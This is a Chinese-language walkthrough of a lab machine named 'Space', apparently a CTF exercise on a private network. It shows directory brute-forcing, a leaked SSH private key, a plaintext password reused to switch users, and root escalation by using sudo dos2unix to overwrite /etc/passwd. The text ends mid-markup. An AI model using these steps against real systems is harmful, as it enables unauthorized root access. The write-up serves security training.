KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEA53wtJ27uQatcM+9fP8gZCT7ioVbSmFM5MWZZ+4ZZ/AJswfuI9ndz<br>ADvJgrVgCj2//vHO7Hla0V4S7nHccrFLVuHxzxtcTXiITKmo+S0N0uBu0NdkzFwvmTPqR4<br>tG/p1G6fgt9fms9tqw/A2EYf5Mk/cDv9OwhGldUArQZD9Dd/Zy7ZnRGhBVHm/HTxbwCad0<br>n4Or9+PEUzJb5Uw+GG8A3P0J128BUlIxj4M2/I769q3xSG4EuT9kqAJXCdxAvIzZ6OIfEI<br>9yFoRPbDLEe+95y5zoQpH6Yar5LqiK+X+YnxScWWwCe3r4BQJCiHT7LjIK0HH5YUMkFcr7<br>t9QvNytztJPr2pVQET9UdkiN27u2DCygVw5y1q0rP3fCsEZDCUJxcfjn9PZw5IRzqJcO1B<br>PIFacPpvv/jWI1DA1smd0+xr/AUWEBL4892GZ6hMR4uNLlva2iPoTs4cfZthecXWd0ImCy<br>WcSe6S5pFNWZ+C/u7Td7l46xhlN6Tw/N2n1vQrupAAAFiGVFw9FlRcPRAAAAB3NzaC1yc2<br>EAAAGBAOd8LSdu7kGrXDPvXz/IGQk+4qFW0phTOTFmWfuGWfwCbMH7iPZ3cwA7yYK1YAo9<br>v/7xzux5WtFeEu5x3HKxS1bh8c8bXE14iEypqPktDdLgbtDXZMxcL5kz6keLRv6dRun4Lf<br>X5rPbasPwNhGH+TJP3A7/TsIRpXVAK0GQ/Q3f2cu2Z0RoQVR5vx08W8AmndJ+Dq/fjxFMy<br>W+VMPhhvANz9CddvAVJSMY+DNvyO+vat8UhuBLk/ZKgCVwncQLyM2ejiHxCPchaET2wyxH<br>vvecuc6EKR+mGq+S6oivl/mJ8UnFlsAnt6+AUCQoh0+y4yCtBx+WFDJBXK+7fULzcrc7ST<br>69qVUBE/VHZIjdu7tgwsoFcOctatKz93wrBGQwlCcXH45/T2cOSEc6iXDtQTyBWnD6b7/4<br>1iNQwNbJndPsa/wFFhAS+PPdhmeoTEeLjS5b2toj6E7OHH2bYXnF1ndCJgslnEnukuaRTV<br>mfgv7u03e5eOsYZTek8Pzdp9b0K7qQAAAAMBAAEAAAGADZsS3Fp8zodP6A2Nv6X3Mr/rei<br>gsQJ/DoM+vQkVnTJSn587tAe+LZtwcv/4BIxj2C/oSe3u2hs/MtQ8kMemR0A1/tPiauEL5<br>X+go8lxfj6F5YfUHC6vvcEXI42OgTJ7Z6C6aJPcD346DEI2K1meoAJpoMgIzQdUfkvDPxt<br>ShFo/5uVVtIOcM2bkgMdnbSfX5uNZ4aR2OEIXJOPT+QVlk55hH183CeiAyoYjI1pdg0Nbw<br>c51j0a+ULvvUOdQkSfDNUXD2G7I6UxIYCWOkh2uq0ddPU+Kwe7d12+cnvpub1BEtKAfCTG<br>+NSL8y76bO2u/I7f/kPRzV7Hm4po0X5tZc0fn1tctqV2M+Hu+JoCrs/yVwo0CuA29h/pHh<br>cg1cBzn7jISuDMIAU5l8/nzs4/q/AIfQzqywYUrt04dkcTBmoPyI1QZiD6LufA8L8ZYqQB<br>TrzFsiw/DZNIUBW0XKECr3OQWiaTz44g1YWxKCpFjbXOcR+E25BNAL8eTl3D63OIIBAAAA<br>wCszq5giZqnTab2lVPvtEDePkQHRBZzShp0xm5Ru5kCyzoCrkbyrHH0GhoH77RIItrwd/3<br>XHXtzSAXsWWWiTIkO4zl9xV0dTs85mqeLCSQtS4yG8rz1vMsPCRPysKAo0pXMgvvKHqehl<br>yIU99M3jVPbBiwIuXFGohWr4agxrqMOcsuNIPx3PFmO3lqo08blC+GUBerk8+fiIhkJWe0<br>izzECGHV9xcCoOiwiAdQjr2hNzw9QfnpO/w9uWKmb1397aoQAAAMEA9D47nMj7KvxQtcWz<br>XMXnbqE1Z9EDavrAoA1zZSLrGzJs7jWZyWJuKv450wuf2fqrMCMA0BVngNnS3ljXj04pAg<br>EU5sFE8WOlVNvC9iSd1x5Nmo7DMItdKSHeJop63flzvi+7aNg9VX+qWS4oWMuMZ0m7Vupf<br>mC+xiO+dng7BBFWKIYqrcdWCuBqA6TdOt/qycejhZpTzXzYs/KsmMBjl7uSuUQZu2f6GDl<br>KvCxTjcpE8v7FgSPJv4TNg/DjbEneZAAAAwQDyoLp4Rapn6iXTKFqOAL/8m+uH8dqgB5OD<br>560gxDEgINdYzxwfOz+p3gphSp54MczEJEnYnfvDfKYKR5ty0AXS0iEjEoGAQFXuRjWEQf<br>MeTEb+VqnK/Y5sNXWwW/FVr2tTibwA0QlzQEtOOAceh5HcKrtKpxZjkK2d4odvY6MmbL/J<br>Rtgh4TMV09EokfXACR9F/bNY5Lu+xFMef4NWtXl3e0GEZcoLDSsKCuloOJJoJR/IM1w8gs<br>Bl1Hds+8Z7rpEAAAAMYW5kZWxpQFNwYWNlAQIDBAUGBw==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><h2 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.38 -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.38<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,bak,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 14241]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/check.php            (Status: 302) [Size: 0] [--&gt; index.php]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>未发现其他目录</p><h1 id="SSH渗透"><a href="#SSH渗透" class="headerlink" title="SSH渗透"></a>SSH渗透</h1><h2 id="1、ssh登录"><a href="#1、ssh登录" class="headerlink" title="1、ssh登录"></a>1、ssh登录</h2><p>尝试使用发现的私钥进行登录</p><ul><li><p>保存私钥到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# wget http://192.168.2.38/andeli.id_rsa<br>--2025-06-23 23:01:22--  http://192.168.2.38/andeli.id_rsa<br>正在连接 192.168.2.38:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2640 (2.6K)<br>正在保存至: “andeli.id_rsa”<br><br>andeli.id_rsa                       100%[==================================================================&gt;]   2.58K  --.-KB/s  用时 0s      <br><br>2025-06-23 23:01:22 (108 MB/s) - 已保存 “andeli.id_rsa” [2640/2640])<br></code></pre></td></tr></table></figure></li><li><p>修改私钥的权限 <strong>私钥的权限必须为600</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">chmod</span> 600 andeli.id_rsa <br></code></pre></td></tr></table></figure></li><li><p>尝试进行SSH登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh andeli@192.168.2.38 -i andeli.id_rsa <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.38 (192.168.2.38)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:5: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:7: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:8: [hashed name]</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.38<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Load key &quot;andeli.id_rsa&quot;: error in libcrypto</span><br><span class="hljs-string">andeli@192.168.2.38&#x27;</span>s password:<br></code></pre></td></tr></table></figure><p>提示<code>Load key &quot;andeli.id_rsa&quot;: error in libcrypto</code></p></li></ul><h2 id="2、CRLF-remove"><a href="#2、CRLF-remove" class="headerlink" title="2、CRLF remove"></a>2、CRLF remove</h2><ul><li>查看私钥里面不可见的字符<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> -A andeli.id_rsa <br>-----BEGIN OPENSSH PRIVATE KEY-----^M$<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn^M$<br>NhAAAAAwEAAQAAAYEA53wtJ27uQatcM+9fP8gZCT7ioVbSmFM5MWZZ+4ZZ/AJswfuI9ndz^M$<br>ADvJgrVgCj2//vHO7Hla0V4S7nHccrFLVuHxzxtcTXiITKmo+S0N0uBu0NdkzFwvmTPqR4^M$<br>tG/p1G6fgt9fms9tqw/A2EYf5Mk/cDv9OwhGldUArQZD9Dd/Zy7ZnRGhBVHm/HTxbwCad0^M$<br>n4Or9+PEUzJb5Uw+GG8A3P0J128BUlIxj4M2/I769q3xSG4EuT9kqAJXCdxAvIzZ6OIfEI^M$<br>9yFoRPbDLEe+95y5zoQpH6Yar5LqiK+X+YnxScWWwCe3r4BQJCiHT7LjIK0HH5YUMkFcr7^M$<br>t9QvNytztJPr2pVQET9UdkiN27u2DCygVw5y1q0rP3fCsEZDCUJxcfjn9PZw5IRzqJcO1B^M$<br>PIFacPpvv/jWI1DA1smd0+xr/AUWEBL4892GZ6hMR4uNLlva2iPoTs4cfZthecXWd0ImCy^M$<br>WcSe6S5pFNWZ+C/u7Td7l46xhlN6Tw/N2n1vQrupAAAFiGVFw9FlRcPRAAAAB3NzaC1yc2^M$<br>EAAAGBAOd8LSdu7kGrXDPvXz/IGQk+4qFW0phTOTFmWfuGWfwCbMH7iPZ3cwA7yYK1YAo9^M$<br>v/7xzux5WtFeEu5x3HKxS1bh8c8bXE14iEypqPktDdLgbtDXZMxcL5kz6keLRv6dRun4Lf^M$<br>X5rPbasPwNhGH+TJP3A7/TsIRpXVAK0GQ/Q3f2cu2Z0RoQVR5vx08W8AmndJ+Dq/fjxFMy^M$<br>W+VMPhhvANz9CddvAVJSMY+DNvyO+vat8UhuBLk/ZKgCVwncQLyM2ejiHxCPchaET2wyxH^M$<br>vvecuc6EKR+mGq+S6oivl/mJ8UnFlsAnt6+AUCQoh0+y4yCtBx+WFDJBXK+7fULzcrc7ST^M$<br>69qVUBE/VHZIjdu7tgwsoFcOctatKz93wrBGQwlCcXH45/T2cOSEc6iXDtQTyBWnD6b7/4^M$<br>1iNQwNbJndPsa/wFFhAS+PPdhmeoTEeLjS5b2toj6E7OHH2bYXnF1ndCJgslnEnukuaRTV^M$<br>mfgv7u03e5eOsYZTek8Pzdp9b0K7qQAAAAMBAAEAAAGADZsS3Fp8zodP6A2Nv6X3Mr/rei^M$<br>gsQJ/DoM+vQkVnTJSn587tAe+LZtwcv/4BIxj2C/oSe3u2hs/MtQ8kMemR0A1/tPiauEL5^M$<br>X+go8lxfj6F5YfUHC6vvcEXI42OgTJ7Z6C6aJPcD346DEI2K1meoAJpoMgIzQdUfkvDPxt^M$<br>ShFo/5uVVtIOcM2bkgMdnbSfX5uNZ4aR2OEIXJOPT+QVlk55hH183CeiAyoYjI1pdg0Nbw^M$<br>c51j0a+ULvvUOdQkSfDNUXD2G7I6UxIYCWOkh2uq0ddPU+Kwe7d12+cnvpub1BEtKAfCTG^M$<br>+NSL8y76bO2u/I7f/kPRzV7Hm4po0X5tZc0fn1tctqV2M+Hu+JoCrs/yVwo0CuA29h/pHh^M$<br>cg1cBzn7jISuDMIAU5l8/nzs4/q/AIfQzqywYUrt04dkcTBmoPyI1QZiD6LufA8L8ZYqQB^M$<br>TrzFsiw/DZNIUBW0XKECr3OQWiaTz44g1YWxKCpFjbXOcR+E25BNAL8eTl3D63OIIBAAAA^M$<br>wCszq5giZqnTab2lVPvtEDePkQHRBZzShp0xm5Ru5kCyzoCrkbyrHH0GhoH77RIItrwd/3^M$<br>XHXtzSAXsWWWiTIkO4zl9xV0dTs85mqeLCSQtS4yG8rz1vMsPCRPysKAo0pXMgvvKHqehl^M$<br>yIU99M3jVPbBiwIuXFGohWr4agxrqMOcsuNIPx3PFmO3lqo08blC+GUBerk8+fiIhkJWe0^M$<br>izzECGHV9xcCoOiwiAdQjr2hNzw9QfnpO/w9uWKmb1397aoQAAAMEA9D47nMj7KvxQtcWz^M$<br>XMXnbqE1Z9EDavrAoA1zZSLrGzJs7jWZyWJuKv450wuf2fqrMCMA0BVngNnS3ljXj04pAg^M$<br>EU5sFE8WOlVNvC9iSd1x5Nmo7DMItdKSHeJop63flzvi+7aNg9VX+qWS4oWMuMZ0m7Vupf^M$<br>mC+xiO+dng7BBFWKIYqrcdWCuBqA6TdOt/qycejhZpTzXzYs/KsmMBjl7uSuUQZu2f6GDl^M$<br>KvCxTjcpE8v7FgSPJv4TNg/DjbEneZAAAAwQDyoLp4Rapn6iXTKFqOAL/8m+uH8dqgB5OD^M$<br>560gxDEgINdYzxwfOz+p3gphSp54MczEJEnYnfvDfKYKR5ty0AXS0iEjEoGAQFXuRjWEQf^M$<br>MeTEb+VqnK/Y5sNXWwW/FVr2tTibwA0QlzQEtOOAceh5HcKrtKpxZjkK2d4odvY6MmbL/J^M$<br>Rtgh4TMV09EokfXACR9F/bNY5Lu+xFMef4NWtXl3e0GEZcoLDSsKCuloOJJoJR/IM1w8gs^M$<br>Bl1Hds+8Z7rpEAAAAMYW5kZWxpQFNwYWNlAQIDBAUGBw==^M$<br>-----END OPENSSH PRIVATE KEY-----^M$<br></code></pre></td></tr></table></figure>每一行后面都有换行符，破坏了密钥结构<br><code>如果是使用复制粘贴，而非wget下载，就不会存在上述的问题</code></li></ul><p>使用命令转换文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# dos2unix andeli.id_rsa            <br>dos2unix: 正在转换文件 andeli.id_rsa 为Unix格式...<br></code></pre></td></tr></table></figure><p>转换后还存在问题，直接复制粘贴秘钥</p><h2 id="3、重新进行ssh登录"><a href="#3、重新进行ssh登录" class="headerlink" title="3、重新进行ssh登录"></a>3、重新进行ssh登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh andeli@192.168.2.38 -i <span class="hljs-built_in">id</span>           <br>Linux Space 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>andeli@Space:~$ <br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-cea97ada-4f00-11f0-af69-57bd20d8ec7c&#125;<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用<code>sudo -l</code>进行查看，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> andeli: <br></code></pre></td></tr></table></figure><h2 id="1、切换到另外一个用户"><a href="#1、切换到另外一个用户" class="headerlink" title="1、切换到另外一个用户"></a>1、切换到另外一个用户</h2><p>查看用户的<code>home</code>目录，发现存在一个<code>user_data.json</code>文件<br>查看发现是一些用户名和密码，同时观察到有一串密码是有颜色的<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506241726083.png"></p><p>查看<code>passwd</code>文件，发现存在一个<code>a3170</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>andeli:x:1000:1000:,,,:/home/andeli:/bin/bash<br>a3170:x:1001:1001:,,,:/home/a3170:/bin/bash<br></code></pre></td></tr></table></figure><p>尝试使用用户<code>a3170</code>和密码<code>31703170317031703170</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ ssh a3170@127.0.0.1<br>The authenticity of host <span class="hljs-string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>127.0.0.1<span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">a3170@127.0.0.1&#x27;</span>s password: <br>Linux Space 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>a3170@Space:~$ <br></code></pre></td></tr></table></figure><h2 id="2、dos2unix提权"><a href="#2、dos2unix提权" class="headerlink" title="2、dos2unix提权"></a>2、dos2unix提权</h2><p>使用<code>sudo -l</code>查看，发现<code>dos2unix</code>不需要密码也可执行<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> a3170 on Space:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User a3170 may run the following commands on Space:<br>    (ALL) NOPASSWD: /usr/bin/dos2unix<br></code></pre></td></tr></table></figure><p>查看<code>dos2unix</code>的使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ /usr/bin/dos2unix -h<br>Usage: dos2unix [options] [file ...] [-n infile outfile ...]<br> --allow-chown         allow file ownership change<br> -ascii                convert only line breaks (default)<br> -iso                  conversion between DOS and ISO-8859-1 character <span class="hljs-built_in">set</span><br>   -1252               use Windows code page 1252 (Western European)<br>   -437                use DOS code page 437 (US) (default)<br>   -850                use DOS code page 850 (Western European)<br>   -860                use DOS code page 860 (Portuguese)<br>   -863                use DOS code page 863 (French Canadian)<br>   -865                use DOS code page 865 (Nordic)<br> -7                    convert 8 bit characters to 7 bit space<br> -b, --keep-bom        keep Byte Order Mark<br> -c, --convmode        conversion mode<br>   convmode            ascii, 7bit, iso, mac, default to ascii<br> -f, --force           force conversion of binary files<br> -h, --<span class="hljs-built_in">help</span>            display this <span class="hljs-built_in">help</span> text<br> -i, --info[=FLAGS]    display file information<br>   file ...            files to analyze<br> -k, --keepdate        keep output file <span class="hljs-built_in">date</span><br> -L, --license         display software license<br> -l, --newline         add additional newline<br> -m, --add-bom         add Byte Order Mark (default UTF-8)<br> -n, --newfile         write to new file<br>   infile              original file <span class="hljs-keyword">in</span> new-file mode<br>   outfile             output file <span class="hljs-keyword">in</span> new-file mode<br> --no-allow-chown      don<span class="hljs-string">&#x27;t allow file ownership change (default)</span><br><span class="hljs-string"> -o, --oldfile         write to old file (default)</span><br><span class="hljs-string">   file ...            files to convert in old-file mode</span><br><span class="hljs-string"> -q, --quiet           quiet mode, suppress all warnings</span><br><span class="hljs-string"> -r, --remove-bom      remove Byte Order Mark (default)</span><br><span class="hljs-string"> -s, --safe            skip binary files (default)</span><br><span class="hljs-string"> -u,  --keep-utf16     keep UTF-16 encoding</span><br><span class="hljs-string"> -ul, --assume-utf16le assume that the input format is UTF-16LE</span><br><span class="hljs-string"> -ub, --assume-utf16be assume that the input format is UTF-16BE</span><br><span class="hljs-string"> -v,  --verbose        verbose operation</span><br><span class="hljs-string"> -F, --follow-symlink  follow symbolic links and convert the targets</span><br><span class="hljs-string"> -R, --replace-symlink replace symbolic links with converted files</span><br><span class="hljs-string">                         (original target files remain unchanged)</span><br><span class="hljs-string"> -S, --skip-symlink    keep symbolic links and targets unchanged (default)</span><br><span class="hljs-string"> -V, --version         display version number</span><br></code></pre></td></tr></table></figure><p>发现参数<code>-n</code>可以写入文件</p><p>尝试修改用户<code>a3170</code>的<code>UID</code>和<code>GID</code>和<code>root</code>一样，然后覆盖<code>/etc/passwd</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd &gt; /tmp/passwd<br>a3170@Space:~$ vi /tmp/passwd<br>a3170@Space:~$ <span class="hljs-built_in">sudo</span> /usr/bin/dos2unix -n /tmp/passwd  /etc/passwd<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 